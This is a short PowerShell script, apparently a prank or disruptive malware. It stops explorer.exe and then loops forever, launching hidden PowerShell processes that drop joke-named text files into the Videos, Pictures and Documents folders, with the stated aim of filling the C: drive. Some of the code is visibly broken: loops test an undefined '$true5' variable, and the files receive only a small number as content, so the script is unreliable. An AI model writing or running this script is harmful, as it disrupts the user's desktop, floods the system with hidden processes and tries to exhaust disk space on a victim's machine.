# Loop infinitely
while ($true5) {
    Start-Sleep -Seconds 1
}
# End explorer.exe process
Stop-Process -Name explorer

# Loop every second
while ($true5) {
    Start-Sleep -Seconds 1
}
# Set the paths to the Videos, Photos, and Documents folders
$videos = "$([Environment]::GetFolderPath("MyVideos"))"
$photos = "$([Environment]::GetFolderPath("MyPictures"))"
$docs = "$([Environment]::GetFolderPath("MyDocuments"))"
# Create an array of file names
$names = @("oh_no", "help send help", "i am the zateinator", "you've been brayzzzd")
# Keep creating files until the disk space is exhausted
while ($true) {
  # Create new PowerShell sessions for each file
  foreach ($name in $names) {
    # Select a random folder
    $folder = Get-Random -InputObject @($videos, $photos, $docs)

    # Create a new file in the selected folder
    Start-Process powershell -ArgumentList "-Command `"New-Item -ItemType File -Path $folder\$name.txt -Value ((Get-Random -Minimum 0 -Maximum 2048) * 16KB)`"" -WindowStyle Hidden
  }

  # Check the available disk space
  $drive = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -eq "C:"}
  if ($drive.FreeSpace -eq 0) {
    break
  }
}
